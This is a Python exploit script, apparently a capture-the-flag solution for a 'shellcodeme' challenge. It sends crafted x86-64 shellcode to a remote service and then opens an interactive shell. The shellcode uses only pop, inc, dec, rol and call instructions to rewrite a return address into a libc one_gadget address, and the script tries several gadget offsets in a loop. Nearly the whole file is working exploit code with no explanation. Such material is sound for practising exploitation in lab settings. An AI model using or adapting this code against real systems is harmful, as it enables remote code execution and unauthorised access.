#!/usr/bin/env python3

from time import sleep
import socket
import sys
import telnetlib

def _p32(num):
    return num.to_bytes(4, byteorder='little')

def _p64(num):
    return num.to_bytes(8, byteorder='little')

def u32(byte_string):
    byte4 = byte_string.ljust(4, b'\0')
    return int.from_bytes(byte4, byteorder='little')

def u64(byte_string):
    byte8 = byte_string.ljust(8, b'\0')
    return int.from_bytes(byte8, byteorder='little')

def p32(*nums):
    data = b''
    for num in nums:
        data += _p32(num)
    return data

def p64(*nums):
    data = b''
    for num in nums:
        data += _p64(num)
    return data

# This is the modified version of interact() in telnetlib.
# It can receive non-ascii data.
# Original interact() is here:
#     https://github.com/python/cpython/blob/master/Lib/telnetlib.py
def _xinteract(tel):
    import selectors
    with telnetlib._TelnetSelector() as selector:
        selector.register(tel, selectors.EVENT_READ)
        selector.register(sys.stdin, selectors.EVENT_READ)

        while True:
            for key, events in selector.select():
                if key.fileobj is tel:
                    try:
                        text = tel.read_eager()
                    except EOFError:
                        print('*** Connection closed by remote host ***')
                        return
                    if text:
                        string = text.decode('ascii', 'backslashreplace')
                        sys.stdout.write(string)
                        sys.stdout.flush()
                elif key.fileobj is sys.stdin:
                    line = sys.stdin.readline().encode('ascii')
                    if not line:
                        return
                    tel.write(line)

class PwnSocket:
    def __init__(self, ip, port):
        self.silent_flag = False
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((ip, port))

    def shell(self):
        tel = telnetlib.Telnet()
        tel.sock = self.sock
        _xinteract(tel)

    def print_bytes(self, byte_str):
        if not self.silent_flag:
            string = byte_str.decode('ascii', 'backslashreplace')
            sys.stdout.write(string)
            sys.stdout.flush()

    def send(self, message):
        self.print_bytes(message)
        self.sock.send(message)

    def send_str(self, string):
        self.send(string.encode('ascii'))

    def send_int(self, num):
        self.send_str(str(num) + '\n')

    def recv_until(self, delimiter_bytes):
        received_data = b''
        while not received_data.endswith(delimiter_bytes):
            tmp = self.sock.recv(1)
            self.print_bytes(tmp)
            received_data += tmp
        return received_data

    def recv(self, num):
        data = self.sock.recv(num)
        self.print_bytes(data)
        return data

    def set_silent(self):
        self.silent_flag = True

    def unset_silent(self):
        self.silent_flag = False

def rotate_left(n):
    return (n << 1) % (2**64) | (n >> 63)

def build_shellcode(libc_base, return_addr, one_gadget_offset):
    one_gadget = libc_base + one_gadget_offset
    pop_rax = b'\x58'
    inc_rax = b'\x48\xff\xc0'
    dec_rax = b'\x48\xff\xc8'
    rol_rax = b'\x48\xd1\xc0'
    call_rax = b'\xff\xd0'

    zero2one  = inc_rax + rol_rax
    one2zero  = dec_rax + rol_rax

    shellcode = pop_rax
    for i in range(64):
        if (one_gadget & 1) == (return_addr & 1):
            shellcode += rol_rax
        elif (one_gadget & 1) and not (return_addr & 1):
            shellcode += zero2one
        else:
            shellcode += one2zero
        return_addr = rotate_left(return_addr)
        one_gadget  = rotate_left(one_gadget)
    shellcode += call_rax
    shellcode += b'\x0a'
    with open('shellcode', 'wb') as f:
        f.write(shellcode)
    return shellcode

def main(target, libc_base, return_addr, one_gadget_offset):
    if target == 'remote':
        hostname = 'shellcodeme.420blaze.in'
        ip = socket.gethostbyname(hostname)
        port = 4200
    else:
        hostname = 'localhost'
        ip = socket.gethostbyname(hostname)

    if target == 'debug':
        port = 12345
    elif target == 'no-debug':
        port = 23456

    shellcode = build_shellcode(libc_base, return_addr, one_gadget_offset)

    ps = PwnSocket(ip, port)
    ps.recv_until(b'?\n')
    ps.send(shellcode)

    ps.shell()

if __name__ == '__main__':
    libc_base_gdb   = 0x7ffff7a0d000
    return_addr_gdb = 0x7ffff7a575d0
    local_offsets = [283158, 283242, 983716, 987463]
    if len(sys.argv) == 2 and sys.argv[1] == '--remote':
        target = 'remote'
        one_gadget_offsets = [287784, 287868, 955413, 959341]
        libc_base = libc_base_gdb
        return_addr = libc_base + 0x49800
    elif len(sys.argv) == 2 and sys.argv[1] == '--no-debug':
        one_gadget_offsets = local_offsets
        target = 'no-debug'
        libc_base = libc_base_gdb
        return_addr = return_addr_gdb
    else:
        one_gadget_offsets = local_offsets
        target = 'debug'
        libc_base = libc_base_gdb
        return_addr = return_addr_gdb
    for i in one_gadget_offsets:
        main(target, libc_base, return_addr, i)
